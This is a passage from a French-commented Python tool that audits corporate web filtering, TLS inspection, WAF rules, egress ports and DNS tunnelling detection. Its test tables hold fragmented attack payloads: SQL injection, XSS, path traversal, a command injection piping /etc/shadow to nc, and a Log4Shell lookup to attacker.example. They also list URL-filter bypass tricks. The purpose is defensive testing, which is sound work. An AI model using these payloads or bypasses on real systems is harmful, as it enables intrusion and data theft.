    ("Certificat auto-signé",          "self-signed.badssl.com",    443,  "self_signed",    EXPECT_BLOCKED, "Aucune autorité de confiance"),
    ("Nom d'hôte incorrect",           "wrong.host.badssl.com",     443,  "wrong_host",     EXPECT_BLOCKED, "CN/SAN ne correspond pas"),
    ("Autorité non approuvée",         "untrusted-root.badssl.com", 443,  "untrusted_root", EXPECT_BLOCKED, "Racine inconnue"),
    ("Certificat révoqué",             "revoked.badssl.com",        443,  "revoked",        EXPECT_BLOCKED, "Contrôle OCSP/CRL du proxy"),
    ("Chiffrement RC4",                "rc4.badssl.com",            443,  "weak_cipher",    EXPECT_BLOCKED, "Suite obsolète"),
    ("Chiffrement 3DES",               "3des.badssl.com",           443,  "weak_cipher",    EXPECT_BLOCKED, "Suite obsolète"),
    ("Clé RSA 512 bits",               "rsa512.badssl.com",         443,  "weak_key",       EXPECT_BLOCKED, "Clé cassable"),
    ("TLS 1.0",                        "tls-v1-0.badssl.com",       1010, "old_tls",        EXPECT_BLOCKED, "Version dépréciée (PCI-DSS)"),
    ("TLS 1.1",                        "tls-v1-1.badssl.com",       1011, "old_tls",        EXPECT_BLOCKED, "Version dépréciée"),
]

# ── Couche applicative : tests différentiels sur point d'écho contrôlé ───────
# kind: ua | query | header | body
APP_TESTS = [
    dict(name="User-Agent sqlmap",      kind="ua",     value="sqlmap/1.8.2#stable (https://sqlmap.org)", expected=EXPECT_BLOCKED, description="Signature de scanner SQLi"),
    dict(name="User-Agent Nikto",       kind="ua",     value="Mozilla/5.00 (Nikto/2.5.0)",               expected=EXPECT_BLOCKED, description="Scanner de vulnérabilités web"),
    dict(name="User-Agent Nmap NSE",    kind="ua",     value="Mozilla/5.0 (compatible; Nmap Scripting Engine)", expected=EXPECT_BLOCKED, description="Reconnaissance réseau"),
    dict(name="User-Agent curl (témoin)",kind="ua",    value="curl/8.4.0",                               expected=EXPECT_ALLOWED, description="Client légitime : ne doit pas être bloqué"),
    # Les charges d'exploit sont stockées en FRAGMENTS inertes (assemblés à
    # l'exécution par run_app_test) : aucune chaîne d'attaque complète n'existe
    # dans ce fichier, ce qui évite les fausses détections antivirus au repos.
    dict(name="Injection SQL en URL",   kind="query",  value=("1' OR '1'='1' UN", "ION SEL", "ECT NULL,version()--"), expected=EXPECT_BLOCKED, description="Charge SQLi classique"),
    dict(name="XSS en URL",             kind="query",  value=("<scr", "ipt>", "alert(document.cookie)", "</scr", "ipt>"),  expected=EXPECT_BLOCKED, description="Charge XSS réfléchie"),
    dict(name="Traversée de répertoire",kind="query",  value=("../../../../", "etc/", "passwd"),                   expected=EXPECT_BLOCKED, description="Path traversal"),
    dict(name="Injection de commande",  kind="query",  value=(";", "cat /etc/", "shad", "ow|", "nc 10.0.0.1 4444"),  expected=EXPECT_BLOCKED, description="Command injection"),
    dict(name="Log4Shell (JNDI)",       kind="query",  value=("${", "jn", "di:ld", "ap://attacker.example/a}"),      expected=EXPECT_BLOCKED, description="CVE-2021-44228"),
    dict(name="Shellshock (en-tête)",   kind="header", value=("() { :", ";}; /bin/", "bash -c 'id'"),               expected=EXPECT_BLOCKED, description="CVE-2014-6271 via User-Agent"),
    dict(name="Requête normale (témoin)",kind="query", value="rapport annuel 2026",                      expected=EXPECT_ALLOWED, description="Trafic normal : témoin de faux positif WAF"),
]

# ── Contournement ────────────────────────────────────────────────────────────
BYPASS_TESTS = [
    dict(name="IP directe — site adulte",     kind="direct_ip",   domain="www.pornhub.com", scheme="https", expected=EXPECT_BLOCKED,
         description="Connexion à l'IP sans nom de domaine : détecte un filtrage purement DNS"),
    dict(name="IP directe — plateforme crypto", kind="direct_ip", domain="www.binance.com", scheme="https", expected=EXPECT_BLOCKED,
         description="Idem sur une catégorie discrétionnaire"),
    dict(name="IP directe — annuaire Tor",    kind="direct_ip",   domain="ahmia.fi",        scheme="https", expected=EXPECT_BLOCKED,
         description="Idem sur une catégorie critique"),
    dict(name="Hostname en majuscules",       kind="case",        domain="www.PORNHUB.com", scheme="https", expected=EXPECT_BLOCKED,
         description="Contourne les filtres sensibles à la casse"),
    dict(name="Point final (FQDN absolu)",    kind="trailing_dot",domain="www.pornhub.com", scheme="https", expected=EXPECT_BLOCKED,
         description="« domaine. » : même hôte, chaîne différente pour un filtre naïf"),
    dict(name="Point final — crypto",         kind="trailing_dot",domain="www.binance.com", scheme="https", expected=EXPECT_BLOCKED,
         description="Idem"),
    dict(name="IP en notation décimale",      kind="decimal_ip",  domain="www.pornhub.com", scheme="http",  expected=EXPECT_BLOCKED,
         description="http://3232235777/ : contourne l'analyse d'URL"),
    dict(name="CDN Discord (cdn.discordapp)", kind="url", url="https://cdn.discordapp.com/embed/avatars/0.png", category="social_media", expected=EXPECT_POLICY,
         description="CDN souvent oublié dans les règles : canal d'exfiltration"),
    dict(name="CDN X/Twitter (abs.twimg)",    kind="url", url="https://abs.twimg.com/favicons/twitter.ico", category="social_media", expected=EXPECT_POLICY,
         description="Domaine de service non couvert par les règles « web »"),
    dict(name="TikTok mobile (m.)",           kind="url", url="https://m.tiktok.com/",       category="social_media", expected=EXPECT_POLICY,
         description="Sous-domaine mobile"),
    dict(name="CDN Telegram (telegram.org)",  kind="url", url="https://telegram.org/img/t_logo.png", category="social_media", expected=EXPECT_POLICY,
         description="Ressource statique du domaine principal"),
    dict(name="Sortie TCP sur port 8443",     kind="alt_port", url="http://portquiz.net:8443/", expected=EXPECT_BLOCKED,
         description="Port HTTPS alternatif : contourne les proxies liés au 443"),
    dict(name="HTTP sur port 8080",           kind="alt_port", url="http://portquiz.net:8080/",  expected=EXPECT_BLOCKED,
         description="HTTP hors proxy d'entreprise"),
    dict(name="Tunnel HTTP CONNECT direct",   kind="connect_proxy", url="portquiz.net:443",      expected=EXPECT_BLOCKED,
         description="Sortie TCP directe sans passer par le proxy déclaré"),
]

# ── Protocoles alternatifs : bannière lue pour prouver le passage applicatif ──
PROTOCOL_TESTS = [
    ("FTP (21)",              "test.rebex.net",     21,   "ftp",   EXPECT_BLOCKED, "220",     "Serveur FTP public de test"),
    ("FTP alternatif (2121)", "portquiz.net",       2121, "tcp",   EXPECT_BLOCKED, "",        "FTP sur port non standard"),
    ("SSH (22)",              "test.rebex.net",     22,   "ssh",   EXPECT_BLOCKED, "SSH-",    "Tunnel SSH sortant"),
    ("SSH alternatif (2222)", "portquiz.net",       2222, "tcp",   EXPECT_BLOCKED, "",        "SSH sur port non standard"),
    ("SMTP direct (25)",      "smtp.gmail.com",     25,   "smtp",  EXPECT_BLOCKED, "220",     "SMTP sortant direct : spam/exfiltration"),
    ("SMTPS (465)",           "smtp.gmail.com",     465,  "tcp",   EXPECT_BLOCKED, "",        "SMTP implicite TLS"),
    ("IMAP (143)",            "imap.gmail.com",     143,  "imap",  EXPECT_BLOCKED, "* OK",    "Messagerie personnelle"),
    ("IMAPS (993)",           "imap.gmail.com",     993,  "tcp",   EXPECT_BLOCKED, "",        "Messagerie personnelle chiffrée"),
    ("MQTT (1883)",           "test.mosquitto.org", 1883, "tcp",   EXPECT_BLOCKED, "",        "IoT en clair : canal C2 possible"),
    ("MQTT TLS (8883)",       "test.mosquitto.org", 8883, "tcp",   EXPECT_BLOCKED, "",        "IoT chiffré"),
    ("NTP (123/TCP)",         "portquiz.net",       123,  "tcp",   EXPECT_BLOCKED, "",        "NTP doit passer par un relais interne"),
    ("HTTPS 443 (témoin)",    "portquiz.net",       443,  "tcp",   EXPECT_ALLOWED, "",        "Témoin : la sortie 443 doit fonctionner"),
]

# ── Ports non standard : portquiz.net répond sur TOUS les ports TCP ──────────
NON_STANDARD_PORT_TESTS = [
    ("HTTP alt 8080",       8080,  "http_alt",   EXPECT_BLOCKED, "Proxy/serveur applicatif"),
    ("HTTP alt 8000",       8000,  "http_alt",   EXPECT_BLOCKED, "Serveur de développement"),
    ("HTTP alt 8888",       8888,  "http_alt",   EXPECT_BLOCKED, "Interface d'administration"),
    ("HTTPS alt 8443",      8443,  "https_alt",  EXPECT_BLOCKED, "TLS hors 443"),
    ("Proxy Squid 3128",    3128,  "proxy_port", EXPECT_BLOCKED, "Proxy tiers"),
    ("SOCKS 1080",          1080,  "proxy_port", EXPECT_BLOCKED, "Proxy SOCKS : tunnel générique"),
    ("MySQL 3306",          3306,  "db_port",    EXPECT_BLOCKED, "Base de données exposée"),
    ("PostgreSQL 5432",     5432,  "db_port",    EXPECT_BLOCKED, "Base de données exposée"),
    ("Redis 6379",          6379,  "db_port",    EXPECT_BLOCKED, "Souvent sans authentification"),
    ("MongoDB 27017",       27017, "db_port",    EXPECT_BLOCKED, "Base de données exposée"),
    ("Elasticsearch 9200",  9200,  "db_port",    EXPECT_BLOCKED, "Index de données"),
    ("API Kubernetes 6443", 6443,  "infra_port", EXPECT_BLOCKED, "Plan de contrôle"),
    ("VNC 5900",            5900,  "infra_port", EXPECT_BLOCKED, "Prise de main à distance"),
    ("Port éphémère 49152", 49152, "high_port",  EXPECT_BLOCKED, "Egress générique haut"),
    ("HTTP 80 (témoin)",    80,    "control",    EXPECT_ALLOWED, "Témoin : la sortie 80 doit fonctionner"),
]
PORTQUIZ_HOST = "portquiz.net"

# ── Exfiltration DNS ─────────────────────────────────────────────────────────
DNS_EXFIL_TESTS = [
    dict(name="Sous-domaine très long (tunnel)",  kind="long_label", expected=EXPECT_BLOCKED,
         description="Étiquette de 60 caractères encodant des données — signature de tunnel DNS"),
    dict(name="Enregistrement TXT sortant",       kind="txt", target="google.com", expected=EXPECT_POLICY,
         description="Les requêtes TXT sont le canal d'exfiltration DNS le plus courant"),
    dict(name="Domaine d'outil de tunnel (dnscat)",kind="resolve", target="dnscat.example.com", expected=EXPECT_BLOCKED,
         description="Nom typique d'outil de tunneling"),
    dict(name="Iodine / tunnel — étiquette base32",kind="long_label_b32", expected=EXPECT_BLOCKED,
         description="Encodage base32 caractéristique d'iodine"),
    dict(name="Volume de requêtes (20 en 5 s)",   kind="burst", expected=EXPECT_POLICY,
         description="Détection de débit anormal de requêtes DNS (rate limiting)"),
    dict(name="DNS rebinding (1.2.3.4.nip.io)",   kind="resolve", target="1.2.3.4.nip.io", expected=EXPECT_BLOCKED,
         description="Service de rebinding : contournement de la politique du navigateur"),
]

# ── Upload de fichiers ───────────────────────────────────────────────────────
UPLOAD_TESTS = [
    ("Fichier texte anodin (témoin)", "rapport.txt", b"Compte rendu d'audit - contenu anodin.",
     "text/plain", EXPECT_ALLOWED, "Témoin : ne doit pas être bloqué"),
    ("EICAR renommé .exe",            "facture.exe", None,
     "application/octet-stream", EXPECT_BLOCKED, "Charge EICAR dans un exécutable"),
    ("EICAR dans une archive ZIP",    "archive.zip", None,
     "application/zip", EXPECT_BLOCKED, "EICAR compressé : teste l'analyse de conteneur"),
    ("Exécutable Windows (en-tête PE)","setup.exe",
     bytes([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]) + b"\x00" * 56 + b"PE\x00\x00",
     "application/x-msdownload", EXPECT_BLOCKED, "En-tête MZ/PE : sortie d'exécutable"),
    # content=None : la charge n'est JAMAIS matérialisée au chargement du module
    # (sinon le scanner mémoire de l'antivirus tue le process). Elle est construite
    # uniquement au moment du test, et seulement si --allow-eicar est actif.
    ("Script PowerShell offensif",    "payload.ps1", "ps",
     "text/plain", EXPECT_BLOCKED, "Motif de téléchargement/exécution"),
    ("Archive protégée par mot de passe", "confidentiel.zip", None,
     "application/zip", EXPECT_POLICY, "Contenu non analysable : la politique doit trancher"),
]

# ── Débit / QoS (informatif, hors score) ────────────────────────────────────
BANDWIDTH_TESTS = [
    ("Téléchargement 1 Mo",   "https://speed.cloudflare.com/__down?bytes=1000000",  "Débit de base"),
    ("Téléchargement 10 Mo",  "https://speed.cloudflare.com/__down?bytes=10000000", "Débit soutenu / détection de bridage"),
    ("Latence (aller-retour)", "https://speed.cloudflare.com/__down?bytes=1000",    "Temps de réponse du chemin"),
    ("CDN générique (jsDelivr)", "https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js", "Accès CDN applicatif"),
]

# Points d'écho utilisés par les modules « app » et « upload ».
ECHO_ENDPOINTS = [
    "https://postman-echo.com",
    "https://httpbin.org",
]

# ═══════════════════════════════════════════════════════════════════════════════
# CHARGE DE TEST EICAR — AUCUNE signature embarquée dans ce fichier
# ═══════════════════════════════════════════════════════════════════════════════
# Ce script ne contient EICAR sous AUCUNE forme (ni brute, ni encodée, ni masquée)
# et n'utilise aucune routine de déchiffrement de données : c'est indispensable
# pour qu'aucun antivirus ne le mette en quarantaine au repos.
#
# * Détection (module eicar) : on identifie EICAR dans un flux DÉJÀ téléchargé, par
#   empreinte md5 d'une fenêtre glissante — aucune charge de référence n'est stockée.
# * Émission (module upload, seulement avec --allow-eicar) : la charge est
#   TÉLÉCHARGÉE à la volée depuis la source officielle, jamais présente dans le code.

_EICAR_MD5   = "44d88612fea8a8f36de82e1278abb02f"
_EICAR_URL   = "https://secure.eicar.org/eicar.com"
_eicar_cache = {"loaded": False, "bytes": None}

def contains_eicar(raw):
    """Détecte la charge EICAR dans un flux téléchargé, par empreinte md5 d'une
    fenêtre glissante de 68 octets — sans aucune référence embarquée."""
    import hashlib
    if not raw or len(raw) < 68:
        return False
    for i in range(len(raw) - 67):
        if hashlib.md5(raw[i:i + 68]).hexdigest() == _EICAR_MD5:
            return True
    return False

def fetch_eicar():
    """Télécharge la charge de test EICAR depuis la source officielle (cache).
    Retourne les 68 octets, ou None si le téléchargement est bloqué/indisponible."""
    import hashlib
    if _eicar_cache["loaded"]:
        return _eicar_cache["bytes"]
    _eicar_cache["loaded"] = True
    try:
        data = requests.get(_EICAR_URL, timeout=(CONNECT_TO, READ_TO),
                            proxies=PROXIES, verify=False,
                            headers={"User-Agent": UA_BROWSER}).content
        for i in range(len(data) - 67):
            if hashlib.md5(data[i:i + 68]).hexdigest() == _EICAR_MD5:
                _eicar_cache["bytes"] = data[i:i + 68]
                break
    except Exception:
        _eicar_cache["bytes"] = None
    return _eicar_cache["bytes"]

def _eicar_zip(sig, password_protected=False):
    """ZIP contenant la charge EICAR fournie (téléchargée), construit en mémoire."""
    import zipfile, io as _io
    buf = _io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("eicar.com", sig)
    data = buf.getvalue()
    if password_protected:
        data = bytearray(data)
        if len(data) > 7:
            data[6] |= 0x01          # bit 0 du general purpose flag = « chiffré »
        data = bytes(data)
    return data

# ═══════════════════════════════════════════════════════════════════════════════
# MOTEUR DE DÉTECTION — pages de blocage, exceptions réseau, DNS brut
# ═══════════════════════════════════════════════════════════════════════════════

# Signatures d'équipements de filtrage (corps de page ou en-têtes).
BLOCK_VENDORS = [
    (r"zscaler",                                   "Zscaler"),
    (r"fortiguard|fortigate|fortinet.{0,40}(block|filtre|denied)", "Fortinet / FortiGuard"),
    (r"blue\s?coat|proxysg|symantec web (security|gateway)",       "Broadcom / Blue Coat"),
    (r"barracuda",                                 "Barracuda"),
    (r"websense|forcepoint",                       "Forcepoint / Websense"),
    (r"mcafee web gateway|skyhigh|trellix",        "Skyhigh / Trellix"),
    (r"cisco umbrella|opendns|umbrella\.com",      "Cisco Umbrella"),
    (r"sophos.{0,40}(web|utm|blocked)",            "Sophos"),
    (r"sonicwall",                                 "SonicWall"),
    (r"palo\s?alto|pan-os|urlfiltering\.paloaltonetworks", "Palo Alto Networks"),
    (r"squid|cache_object|generated by.{0,30}squid","Squid"),
    (r"netskope",                                  "Netskope"),
    (r"iboss",                                     "iboss"),
    (r"lightspeed systems|smoothwall|securly",     "Filtrage éducation"),
    (r"olfeo",                                     "Olfeo"),
    (r"artica|ucopia|kerio|watchguard|untangle",   "Appliance UTM"),
    (r"trend micro.{0,40}(block|filter)",          "Trend Micro"),
    (r"kaspersky.{0,40}(block|denied)",            "Kaspersky"),
    (r"eset.{0,30}(block|parental)",               "ESET"),
    (r"checkpoint|check point.{0,30}(url|block)",  "Check Point"),
    (r"pfsense|opnsense|squidguard|e2guardian|dansguardian", "Filtre open source"),
    (r"cleanbrowsing|nextdns|adguard dns|controld","Résolveur filtrant"),
]

# Formulations d'une page de blocage.
# STRONG : formulation qui ne peut appartenir qu'à une page de filtrage.
# WEAK   : vocabulaire qui apparaît aussi dans des articles de sécurité —
#          n'est retenu que sur une réponse courte (une vraie page de blocage
#          pèse quelques kilo-octets, pas la page d'accueil d'un éditeur).
BLOCK_PHRASES_STRONG = [
    r"acc[eè]s (à ce site |à cette page )?(est |a [ée]t[ée] )?(refus[ée]|interdit|bloqu[ée]|non autoris[ée])",
    r"(cette |la )?(page|url|site|site web|adresse) (demand[ée]e? )?(a [ée]t[ée] |est |vous est )?bloqu[ée]e?",
    r"contenu bloqu[ée] (par|conform[ée]ment)",
    r"votre (administrateur|entreprise|organisation) a bloqu",
    r"navigation interdite|site non autoris[ée]|cat[ée]gorie bloqu[ée]e?",
    r"access to (this|the) ?(web ?site|page|url|resource|content|domain|category)?[^.]{0,40}(has been |is |was )?(denied|blocked|restricted)",
    r"access (has been |is |was )?(denied|blocked|restricted) (by|due to|because of) [^.]{0,60}(polic|filter|administrator|network|security|category)",
    r"(web ?page|website|url|content|request) (is |has been |was )(blocked|denied|restricted)",
    r"blocked by (your |the )?(network|system |it )?(administrator|policy|web filter|security policy|firewall)",
    r"this (page|site|content|url) (is|has been) (not allowed|restricted|blocked)",
    r"votre demande a [ée]t[ée] (bloqu[ée]e|refus[ée]e)",
    r"web page blocked|site blocked|access restricted by",
]
BLOCK_PHRASES_WEAK = [
    # « Access is denied » seul est aussi un message d'erreur applicatif banal
    # (IIS, API) : il ne vaut que sur une page courte portant une signature.
    r"access (is |has been |was )?(denied|forbidden)",
    r"url filtering|web filter(ing)? (policy|alert)|content filter(ing)? (policy|alert)",
    r"politique (de s[ée]curit[ée]|d'utilisation|internet) de (l'|votre )?(entreprise|organisation|soci[ée]t[ée])",
    r"contactez (votre|l')administrateur",
    r"violation de la politique|policy violation",
    r"category:?\s*(adult|pornograph|gambling|malware|phishing|proxy|anonymizer)",
]
SMALL_PAGE     = 30000     # au-delà, on est sur un vrai site, pas sur une page de garde
VERY_SMALL_PAGE = 12000

# Protections d'origine (le réseau a laissé passer, c'est le site qui refuse).
ORIGIN_PROTECTION = [
    (r"cloudflare.{0,200}(ray id|attention required|checking your browser|just a moment)", "Cloudflare"),
    (r"perimeterx|px-captcha",     "PerimeterX"),
    (r"datadome",                  "DataDome"),
    (r"akamai.{0,60}(reference|access denied)", "Akamai"),
    (r"imperva|incapsula",         "Imperva"),
    (r"captcha|recaptcha|hcaptcha","CAPTCHA"),
    (r"unusual traffic|automated queries|bot detection", "Anti-bot"),
]

# En-têtes prouvant que la réponse vient bien du CDN/serveur d'origine.
ORIGIN_HEADERS = ("cf-ray", "x-amz-cf-id", "x-amz-request-id", "x-akamai-transformed",
                  "x-served-by", "x-fastly-request-id", "x-github-request-id",
                  "x-msedge-ref", "x-azure-ref", "x-cache", "x-goog-generation",
                  "alt-svc", "cf-cache-status", "x-vercel-id")

PORTAL_HINTS = re.compile(r"block|filter|denied|proxy|portal|policy|interdit|bloque|webfilter|surfcontrol", re.I)

# Autorités publiques connues : tout autre émetteur sur un site grand public
# trahit une interception TLS.
PUBLIC_CA_HINTS = (
    "digicert", "let's encrypt", "lets encrypt", "isrg", "globalsign", "sectigo",
    "comodo", "godaddy", "google trust services", "amazon", "microsoft",
    "entrust", "identrust", "actalis", "buypass", "certum", "zerossl",
    "cloudflare", "thawte", "geotrust", "rapidssl", "verisign", "quovadis",
    "starfield", "ssl.com", "wotrus", "apple public", "e-tugra", "hydrant",
)

SINKHOLE_IPS = {
    "0.0.0.0", "127.0.0.1", "::", "::1",
    "146.112.61.104", "146.112.61.105", "146.112.61.106", "146.112.61.107",
    "146.112.61.108", "146.112.61.110",          # Cisco Umbrella
    "52.2.4.6", "74.82.42.42", "195.46.39.39",
    "185.228.168.10", "185.228.169.11",          # CleanBrowsing
    "76.76.19.19", "76.223.122.150",             # AdGuard
    "9.9.9.9",
}

# Plages de « puits » DNS : la réponse est une page de blocage, pas le vrai service.
SINKHOLE_NETS = [
    "146.112.61.0/24",      # page de blocage Cisco Umbrella
    "146.112.59.0/24",      # infrastructure de blocage Umbrella
    "185.228.168.0/22",     # CleanBrowsing
    "76.76.19.0/24",        # AdGuard
    "45.90.28.0/22",        # NextDNS
    "192.0.2.0/24",         # TEST-NET-1, utilisé comme réponse neutre
]
_SINKHOLE_NETS = []
for _n in SINKHOLE_NETS:
    try:
        _SINKHOLE_NETS.append(ipaddress.ip_network(_n))
    except ValueError:
        pass

def in_sinkhole_net(ip):
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(a in net for net in _SINKHOLE_NETS)

def is_sinkholed(ip):
    ip = str(ip)
    return ip in SINKHOLE_IPS or in_sinkhole_net(ip) or is_private_ip(ip)

def is_private_ip(ip):
    try:
        a = ipaddress.ip_address(ip)
        return a.is_private or a.is_loopback or a.is_unspecified or a.is_reserved or a.is_link_local
    except ValueError:
        return False

def registrable(host):
    """Domaine enregistrable approximatif (suffisant pour comparer deux hôtes)."""
    if not host:
        return ""
    host = host.strip(".").lower()
    try:
        ipaddress.ip_address(host)
        return host
    except ValueError:
        pass
    parts = host.split(".")
    if len(parts) <= 2:
        return host
    if parts[-2] in ("co", "com", "org", "net", "gouv", "gov", "ac", "edu") and len(parts[-1]) == 2:
        return ".".join(parts[-3:])
    return ".".join(parts[-2:])

def _match_any(patterns, text):
    for pat, label in patterns:
        if re.search(pat, text, re.I | re.S):
            return label
    return ""

def detect_vendor(text, headers):
    """Éditeur de filtrage identifié. Le corps n'est consulté que sur une page
    courte : citer « Fortinet » dans un article ne signifie pas être bloqué."""
    hdr_blob = " ".join(f"{k}: {v}" for k, v in (headers or {}).items())
    in_header = _match_any(BLOCK_VENDORS, hdr_blob)
    if in_header:
        return in_header
    if len(text) <= SMALL_PAGE:
        return _match_any(BLOCK_VENDORS, text[:MAX_BODY])
    return ""

def detect_block_phrase(text):
    """Retourne 'strong', 'weak' ou ''."""
    head = text[:MAX_BODY]
    for pat in BLOCK_PHRASES_STRONG:
        if re.search(pat, head, re.I | re.S):
            return "strong"
    if len(text) <= SMALL_PAGE:
        for pat in BLOCK_PHRASES_WEAK:
            if re.search(pat, head, re.I | re.S):
                return "weak"
    return ""

# ── Cache de résolution ───────────────────────────────────────────────────────
_RESOLVE_CACHE = {}

def resolve_host(host):
    """Résolution système avec cache. Retourne (ips, erreur)."""
    if host in _RESOLVE_CACHE:
        return _RESOLVE_CACHE[host]
    try:
        infos = socket.getaddrinfo(host, None)
        ips = sorted({i[4][0] for i in infos})
        out = (ips, "")
    except socket.gaierror as e:
        out = ([], getattr(e, "strerror", None) or str(e))
    except Exception as e:
        out = ([], str(e)[:80])
    _RESOLVE_CACHE[host] = out
    return out

# ── HTTP ──────────────────────────────────────────────────────────────────────

PROXIES = {}          # injecté au runtime

def http_get(url, headers=None, timeout=None, read_body=True, method="GET", **kw):
    """GET/POST avec lecture bornée du corps. Retourne (resp, body, exception)."""
    h = {"User-Agent": UA_BROWSER,
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8"}
    if headers:
        h.update(headers)
    try:
        resp = requests.request(method, url, headers=h, proxies=PROXIES, verify=False,
                                timeout=timeout or (CONNECT_TO, READ_TO),
                                allow_redirects=True, stream=True, **kw)
        body = ""
        if read_body:
            raw = b""
            try:
                for chunk in resp.iter_content(16384):
                    raw += chunk
                    if len(raw) >= MAX_BODY:
                        break
            except Exception:
                pass
            enc = resp.encoding or "utf-8"
            try:
                body = raw.decode(enc, errors="ignore")
            except (LookupError, TypeError):
                body = raw.decode("utf-8", errors="ignore")
        resp.close()
        return resp, body, None
    except Exception as e:
        return None, "", e

def classify_http(resp, body, target_host):
    """
    Analyse une réponse HTTP.
    Retourne (observed, confidence, details, evidence, vendor).
    """
    code    = resp.status_code
    headers = {k.lower(): v for k, v in resp.headers.items()}
    text    = body or ""
    low     = text.lower()
    vendor  = detect_vendor(low, headers)
    phrase  = detect_block_phrase(low)
    final_host = (urlparse(resp.url).hostname or "").lower()
    hop     = registrable(final_host) != registrable(target_host)
    origin_protect = _match_any(ORIGIN_PROTECTION, low[:40000])

    # Authentification proxy manquante : aucun verdict possible.
    if code == 407:
        return (OBS_INCONCLUSIVE, CONF_CERTAIN,
                "HTTP 407 — authentification proxy requise",
                "Le proxy exige des identifiants : relancer avec --proxy http://user:pass@hote:port", vendor)
    if code == 511:
        return (OBS_INCONCLUSIVE, CONF_CERTAIN,
                "HTTP 511 — portail captif",
                "Le réseau impose une authentification préalable", vendor)

    size    = len(text)
    hdr_blob = " ".join(f"{k}: {v}" for k, v in headers.items())
    vendor_hdr = _match_any(BLOCK_VENDORS, hdr_blob)

    # Signature d'équipement dans les en-têtes : preuve directe.
    if vendor_hdr:
        return (OBS_BLOCKED, CONF_CERTAIN,
                f"Bloqué par {vendor_hdr} (HTTP {code})",
                f"En-tête de réponse émis par « {vendor_hdr} »", vendor_hdr)

    if code == 451:
        return (OBS_BLOCKED, CONF_CERTAIN, "HTTP 451 — bloqué pour raisons légales",
                "Code dédié au blocage administratif", vendor)

    # Page de blocage renvoyée avec un code « normal » : cas le plus fréquent.
    # On exige une formulation explicite, ou un nom d'équipement sur une page
    # courte — sinon un article de sécurité citant « Zscaler » serait compté
    # comme un blocage.
    if phrase and not origin_protect:
        if phrase == "strong" and size <= SMALL_PAGE:
            return (OBS_BLOCKED, CONF_CERTAIN,
                    f"Page de blocage détectée{' — ' + vendor if vendor else ''} (HTTP {code})",
                    f"Formulation de filtrage explicite dans une réponse de {size} octets", vendor)
        if phrase == "strong" and vendor:
            return (OBS_BLOCKED, CONF_PROBABLE,
                    f"Formulation de blocage dans une page volumineuse ({size} o)",
                    "À confirmer manuellement : le contenu peut être éditorial", vendor)
        if phrase == "weak" and vendor and size <= VERY_SMALL_PAGE:
            return (OBS_BLOCKED, CONF_PROBABLE,
                    f"Page courte évoquant un filtrage ({vendor})",
                    f"{size} octets, vocabulaire de filtrage et nom d'équipement", vendor)
    if vendor and size <= VERY_SMALL_PAGE and code != 200:
        return (OBS_BLOCKED, CONF_PROBABLE,
                f"Réponse courte émise par {vendor} (HTTP {code})",
                f"{size} octets seulement", vendor)

    # Redirection vers un portail interne / une IP privée.
    if hop and final_host:
        fh_ips, _ = resolve_host(final_host)
        if any(is_private_ip(ip) for ip in fh_ips):
            return (OBS_BLOCKED, CONF_CERTAIN,
                    f"Redirection vers un portail interne ({final_host})",
                    f"L'hôte final résout vers une adresse privée : {', '.join(fh_ips[:3])}", vendor)
        if PORTAL_HINTS.search(final_host):
            return (OBS_BLOCKED, CONF_PROBABLE,
                    f"Redirection vers {final_host}",
                    "Nom d'hôte évoquant un portail de filtrage", vendor)

    # Refus émis par le site lui-même : le réseau, lui, a laissé passer.
    if origin_protect and code >= 400:
        return (OBS_ALLOWED, CONF_PROBABLE,
                f"HTTP {code} — refus de l'origine ({origin_protect})",
                "Protection anti-robot du site : le flux réseau a bien atteint le serveur", vendor)

    if code in (403, 405, 406, 429):
        cdn = [h for h in ORIGIN_HEADERS if h in headers]
        if cdn:
            return (OBS_ALLOWED, CONF_PROBABLE,
                    f"HTTP {code} renvoyé par le serveur d'origine",
                    f"En-têtes d'origine présents ({', '.join(cdn[:3])}) : "
                    "la réponse provient du service, pas d'un filtre", vendor)
        if len(text) > 3000:
            return (OBS_ALLOWED, CONF_PROBABLE,
                    f"HTTP {code} — page complète servie par le site",
                    f"{len(text)} octets de contenu applicatif : refus émis par l'origine "
                    "(protection anti-robot), pas par un filtre réseau", vendor)
        # Petit corps, aucune signature : impossible de trancher honnêtement.
        return (OBS_INCONCLUSIVE, CONF_PROBABLE,
                f"HTTP {code} sans signature exploitable",
                "Refus non attribuable : ni page de filtrage identifiée, ni preuve "
                "que la réponse vienne du serveur d'origine", vendor)
    if code in (502, 503, 504):
        return (OBS_INCONCLUSIVE, CONF_PROBABLE,
                f"HTTP {code} — service indisponible",
                "Erreur passerelle : origine en panne ou coupure par un intermédiaire", vendor)
    if code in (404, 410):
        return (OBS_ALLOWED, CONF_PROBABLE,
                f"HTTP {code} — ressource absente mais serveur atteint",
                "Le réseau n'a pas bloqué la connexion ; la ressource de test n'existe plus", vendor)
    if 200 <= code < 400:
        return (OBS_ALLOWED, CONF_CERTAIN, f"HTTP {code} — contenu délivré",
                f"{len(text)} octets reçus depuis {final_host or target_host}", vendor)
    return (OBS_ALLOWED, CONF_PROBABLE, f"HTTP {code}",
            "Réponse de l'origine, non identifiée comme blocage", vendor)

def raw_http_probe(ip, port, host_header, sni=None, use_tls=False, path="/"):
    """
    Requête HTTP brute vers une adresse IP : ni résolution DNS, ni proxy.
    C'est exactement ce que ferait un poste cherchant à contourner un filtrage
    basé sur le nom de domaine.
    """
    out = {"status": None, "body": "", "headers": {}, "state": "", "error": ""}
    try:
        sock = socket.create_connection((ip, port), timeout=CONNECT_TO)
    except socket.timeout:
        out["state"] = "timeout"; return out
    except ConnectionRefusedError:
        out["state"] = "refused"; return out
    except OSError as e:
        out["state"] = "unreachable" if "unreachable" in str(e).lower() else "error"
        out["error"] = str(e)[:100]; return out
    try:
        if use_tls:
            ctx = ssl._create_unverified_context()
            sock = ctx.wrap_socket(sock, server_hostname=sni or host_header)
        req = (f"GET {path} HTTP/1.1\r\nHost: {host_header}\r\n"
               f"User-Agent: {UA_BROWSER}\r\nAccept: */*\r\nConnection: close\r\n\r\n")
        sock.sendall(req.encode("ascii", "ignore"))
        sock.settimeout(READ_TO)
        buf = b""
        while len(buf) < 64000:
            try:
